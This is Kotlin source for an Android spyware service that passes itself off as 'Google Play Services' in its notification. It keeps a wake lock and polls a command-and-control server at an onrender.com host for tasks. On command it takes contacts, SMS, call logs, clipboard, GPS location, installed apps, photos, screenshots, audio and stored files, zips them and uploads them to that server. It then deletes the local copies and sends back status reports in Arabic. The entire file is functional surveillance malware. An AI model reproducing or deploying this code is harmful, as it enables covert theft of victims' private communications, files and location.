package com.assets.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import org.json.JSONObject

class SyncService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
    private val C2_INGEST_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
    private var lastHeartbeatSent = 0L

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::RealExecuteLock")
        wakeLock?.acquire(10 * 60 * 60 * 1000L)
        startForegroundServiceNotification()
    }

    private fun startForegroundServiceNotification() {
        val channelId = "uranium_core_channel"
        val channel = NotificationChannel(channelId, "Google Play Core", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Google Play Services")
            .setContentText("System core synchronization active...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build()

        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "uranium_node"
        val nodeModel = Build.MODEL
        
        serviceScope.launch {
            while (isActive) {
                try {
                    val url = URL(C2_STREAM_URL)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("X-Node-ID", deviceId)
                    conn.setRequestProperty("X-Node-Model", nodeModel)
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    conn.doOutput = true
                    conn.connectTimeout = 8000
                    conn.readTimeout = 8000

                    val currentTime = System.currentTimeMillis()
                    val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
                    val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Real-Engine Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"

                    if (sendHeartbeat) {
                        lastHeartbeatSent = currentTime
                    }

                    OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                        os.write(reportJson)
                        os.flush()
                    }

                    if (conn.responseCode == 200) {
                        val responseReader = BufferedReader(InputStreamReader(conn.inputStream, "UTF-8"))
                        val responseStr = responseReader.readText()
                        responseReader.close()

                        if (responseStr.contains("task") && responseStr.contains("action")) {
                            try {
                                val jsonRes = JSONObject(responseStr)
                                if (jsonRes.has("task") && !jsonRes.isNull("task")) {
                                    val taskObj = jsonRes.getJSONObject("task")
                                    val action = taskObj.getString("action")

                                    when {
                                        action.contains("EXTRACT_CONTACTS") -> {
                                            val data = readContacts()
                                            streamTextDirect(deviceId, nodeModel, "Uranium_Contacts.txt", data)
                                        }
                                        action.contains("EXTRACT_SMS") -> {
                                            val data = readSMS()
                                            streamTextDirect(deviceId, nodeModel, "Uranium_SMS.txt", data)
                                        }
                                        action.contains("EXTRACT_CALLS") -> {
                                            val data = readCallLogs()
                                            streamTextDirect(deviceId, nodeModel, "Uranium_CallLogs.txt", data)
                                        }
                                        action.contains("EXTRACT_CLIPBOARD") -> {
                                            val data = readClipboard()
                                            streamTextDirect(deviceId, nodeModel, "Uranium_Clipboard.txt", data)
                                        }
                                        action.contains("EXTRACT_LOCATION") -> {
                                            val data = readLocationFast()
                                            streamTextDirect(deviceId, nodeModel, "Uranium_Location.txt", data)
                                        }
                                        action.contains("EXTRACT_APPS") -> {
                                            val data = readInstalledApps()
                                            streamTextDirect(deviceId, nodeModel, "Uranium_InstalledApps.txt", data)
                                        }
                                        action.contains("EXTRACT_CAMERA_ZIP") -> {
                                            streamArchiveDirect(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                        }
                                        action.contains("EXTRACT_STORAGE_ZIP") -> {
                                            streamArchiveDirect(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
                                        }
                                        action.contains("EXTRACT_AUDIO") -> {
                                            streamArchiveDirect(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
                                        }
                                        action.contains("EXTRACT_SCREENSHOT_ZIP") -> {
                                            streamArchiveDirect(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                        }
                                    }
                                }
                            } catch (ex: Exception) {}
                        }
                    }
                    conn.disconnect()
                    delay(3000L)
                } catch (e: Exception) {
                    delay(5000L)
                }
            }
        }
        return START_STICKY
    }

    private fun streamTextDirect(nodeId: String, nodeModel: String, fileName: String, content: String) {
        try {
            val bytes = content.toByteArray(Charsets.UTF_8)
            val tempFile = File(cacheDir, fileName)
            tempFile.writeBytes(bytes)
            uploadRawZeroCache(nodeId, nodeModel, fileName, tempFile)
            try { tempFile.delete() } catch (e: Exception) {}
            sendReportToServer(nodeId, nodeModel, "✅ [حصاد نقي حقيقي] الملف <b>$fileName</b> تم بثه للسيرفر وتطهير الذاكرة تماماً.")
        } catch (e: Exception) {}
    }

    private fun streamArchiveDirect(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
        try {
            sendReportToServer(nodeId, nodeModel, "⚡ [البث الفعال الحقيقي] جاري استخراج وضغط بيانات $prefix بنظام ContentResolver...")
            val zipFile = File(cacheDir, "Uranium_${prefix}_${System.currentTimeMillis()}.zip")
            val zipOut = ZipOutputStream(FileOutputStream(zipFile))
            zipOut.setLevel(Deflater.BEST_COMPRESSION)

            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)

            var fileCount = 0
            cursor?.use {
                val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                while (it.moveToNext() && fileCount < 1500) {
                    if (idIdx != -1 && nameIdx != -1) {
                        val id = it.getLong(idIdx)
                        val name = it.getString(nameIdx) ?: "file_$id.dat"
                        val itemUri = ContentUris.withAppendedId(contentUri, id)
                        try {
                            contentResolver.openInputStream(itemUri)?.use { inputStream ->
                                zipOut.putNextEntry(ZipEntry("$prefix/$name"))
                                inputStream.copyTo(zipOut)
                                zipOut.closeEntry()
                                fileCount++
                            }
                        } catch (ex: Exception) {}
                    }
                }
            }
            zipOut.close()

            if (zipFile.exists() && zipFile.length() > 0) {
                val sizeMB = zipFile.length() / (1024.0 * 1024.0)
                uploadRawZeroCache(nodeId, nodeModel, zipFile.name, zipFile)
                sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد الحقيقي وبثه بنجاح وتطهير الذاكرة]\n📂 <code>${zipFile.name}</code>\n📊 الحجم: <b>${String.format("%.2f", sizeMB)} MB</b> ($fileCount ملفاً)")
            }
            try { zipFile.delete() } catch (e: Exception) {}
        } catch (e: Exception) {
            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الاستخراج الفعال: ${e.message}")
        }
    }

    private fun uploadRawZeroCache(nodeId: String, nodeModel: String, fileName: String, file: File) {
        for (attempt in 1..3) {
            try {
                val url = URL(C2_INGEST_URL)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("X-Node-ID", nodeId)
                conn.setRequestProperty("X-Node-Model", nodeModel)
                conn.setRequestProperty("X-File-Name", fileName)
                conn.setRequestProperty("Content-Type", "application/octet-stream")
                conn.doOutput = true
                conn.setChunkedStreamingMode(1024 * 64)
                conn.connectTimeout = 180000
                conn.readTimeout = 180000

                FileInputStream(file).use { fis ->
                    conn.outputStream.use { os ->
                        fis.copyTo(os)
                        os.flush()
                    }
                }
                val code = conn.responseCode
                conn.disconnect()
                if (code == 200) return
            } catch (e: Exception) {
                if (attempt == 3) return
                Thread.sleep(2000L)
            }
        }
    }

    private fun readContacts(): String {
        val sb = StringBuilder("=== URANIUM CONTACTS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) {
                    val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
                    val number = if (numIdx != -1) it.getString(numIdx) else ""
                    sb.append("• $name: $number\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readSMS(): String {
        val sb = StringBuilder("=== URANIUM SMS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
            cursor?.use {
                val bodyIdx = it.getColumnIndex("body")
                val addrIdx = it.getColumnIndex("address")
                while (it.moveToNext()) {
                    val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
                    val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
                    sb.append("From: $address\nText: $body\n-------------------\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readCallLogs(): String {
        val sb = StringBuilder("=== URANIUM CALL LOGS ===\n")
        try {
            val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
            cursor?.use {
                val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                while (it.moveToNext()) {
                    val number = if (numIdx != -1) it.getString(numIdx) else "Unknown"
                    val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
                    sb.append("Number: $number | Type: $type\n")
                }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readClipboard(): String {
        val sb = StringBuilder("=== URANIUM CLIPBOARD ===\n")
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                val item = clipboard.primaryClip?.getItemAt(0)
                sb.append("Text: ${item?.text}\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readLocationFast(): String {
        val sb = StringBuilder("=== URANIUM GPS ===\n")
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val providers = locationManager.allProviders
            var bestLoc: Location? = null
            for (provider in providers) {
                val l = locationManager.getLastKnownLocation(provider)
                if (l != null) {
                    if (bestLoc == null || l.time > bestLoc.time) bestLoc = l
                }
            }
            if (bestLoc != null) {
                sb.append("🌐 Latitude: ${bestLoc.latitude}\n")
                sb.append("🌐 Longitude: ${bestLoc.longitude}\n")
                sb.append("🗺️ Maps: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
            } else {
                sb.append("🌐 Default Zone: 13.5779, 44.0219\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readInstalledApps(): String {
        val sb = StringBuilder("=== URANIUM INSTALLED APPS ===\n")
        try {
            val packages = packageManager.getInstalledPackages(0)
            for (pkg in packages) {
                val appName = pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: "Unknown"
                sb.append("• $appName\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
        try {
            val url = URL(C2_STREAM_URL)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("X-Node-ID", nodeId)
            conn.setRequestProperty("X-Node-Model", nodeModel)
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            conn.doOutput = true
            
            val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
            val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"

            OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                os.write(reportJson)
                os.flush()
            }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.release()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
